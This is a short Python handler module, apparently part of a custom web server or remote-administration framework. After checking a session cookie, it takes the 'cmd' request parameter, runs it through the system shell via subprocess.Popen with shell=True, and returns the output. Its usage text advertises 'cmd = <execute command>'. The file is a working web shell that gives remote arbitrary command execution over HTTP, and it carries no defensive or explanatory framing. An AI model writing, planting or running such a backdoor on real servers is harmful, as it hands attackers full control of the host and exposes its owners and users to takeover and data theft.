import subprocess
class start:
    def __init__(self,headers,ip,params,req,post_data,configs,cookies_handler):
        self.headers = headers
        self.req = req
        self.ip = ip
        self.params = params
        self.post_data = post_data
        self.configs = configs
        self.cookies_handler = cookies_handler
        self.stt_code = 200
        self.return_data = {"data":"<html></html>"}
        pass

    def execute(self):
        if "Cookie" in self.headers:
            if self.cookies_handler.check_cookies_by_id(self.headers["Cookie"]):
                self.cookies_handler.update_cookies(self.headers["Cookie"])
                if "cmd" in self.params:
                    cmd = subprocess.Popen(self.params["cmd"], shell=True, stdout=subprocess.PIPE)
                    self.return_data["data"]  = cmd.stdout.read()
                else:
                    self.return_data["data"] = """
                    parameters:
                    cmd = <execute command>
                    """

        return self.stt_code,self.return_data
        pass
